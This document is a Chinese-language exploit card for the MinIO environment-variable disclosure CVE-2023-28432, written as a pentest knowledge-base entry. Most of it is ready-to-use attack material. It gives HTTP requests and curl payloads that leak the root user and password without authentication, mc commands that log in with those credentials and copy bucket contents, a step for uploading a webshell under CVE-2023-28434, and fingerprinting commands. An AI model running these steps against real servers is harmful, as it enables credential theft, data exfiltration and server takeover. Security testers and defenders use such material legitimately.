---
id: MINIO-INFO-DISCLOSURE
title: MinIO 环境变量信息泄露漏洞 (CVE-2023-28432)
product: minio
vendor: MinIO
version_affected: "< RELEASE.2023-03-20T20-16-18Z"
severity: CRITICAL
tags: [info_disclosure, 对象存储, 云原生, 无需认证]
fingerprint: ["MinIO", "minio", "/minio/login", "/minio/health/live", "/minio/health/cluster"]
---

## 漏洞描述

MinIO对象存储在 `/cluster/config` 端点存在未授权信息泄露，可获取 MINIO_ROOT_USER / MINIO_ROOT_PASSWORD 等环境变量。

## 影响版本

- MinIO < RELEASE.2023-03-20T20-16-18Z

## 前置条件

- 目标开放 9000 端口（API）或 9001 端口（Console），运行 MinIO
- 无需认证凭据

## 利用步骤

### CVE-2023-28432: 环境变量泄露

```http
POST /minio/health/cluster?verify HTTP/1.1
Host: target:9000
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```

或:
```http
POST /cluster/config HTTP/1.1
Host: target:9000
Content-Type: 
Content-Length: 0

```

响应包含:
```json
{
  "MINIO_ROOT_USER": "minioadmin",
  "MINIO_ROOT_PASSWORD": "minioadmin",
  "MINIO_VOLUMES": "/data"
}
```

### 利用获取的凭据登录

```bash
# 使用 mc 客户端
mc alias set pwn http://target:9000 minioadmin minioadmin
mc ls pwn/
mc cp pwn/secret-bucket/flag.txt .
```

或使用 Web Console (通常端口 9001):
```
http://target:9001/login
```

### 默认凭据

- `minioadmin` / `minioadmin` (默认)
- 环境变量: `MINIO_ROOT_USER` / `MINIO_ROOT_PASSWORD`

### CVE-2023-28434: 权限提升

通过 PostPolicy 条件绕过实现非授权文件覆盖:
```bash
# 上传WebShell到可执行路径
mc cp shell.jsp pwn/webapp/shell.jsp
```

## Payload

```bash
# CVE-2023-28432: 环境变量泄露（方法1）
curl -X POST "http://target:9000/minio/health/cluster?verify" \
  -H "Content-Type: application/x-www-form-urlencoded"

# CVE-2023-28432: 环境变量泄露（方法2）
curl -X POST "http://target:9000/cluster/config" \
  -H "Content-Type: "
```

## 验证方法

```bash
# 验证环境变量泄露
curl -s -X POST "http://target:9000/minio/health/cluster?verify" | grep -i "MINIO_ROOT_USER\|MINIO_ROOT_PASSWORD\|MINIO_SECRET_KEY"
# 响应包含凭据信息表示漏洞存在

# 验证默认凭据
curl -s -o /dev/null -w "%{http_code}" "http://target:9000/minio/health/live"
# 返回200表示MinIO服务存活
```

## 指纹确认

```bash
curl -s http://target:9000/minio/health/live
curl -s http://target:9001/ | grep -i "minio"
curl -s -I http://target:9000/ | grep "Server"
```
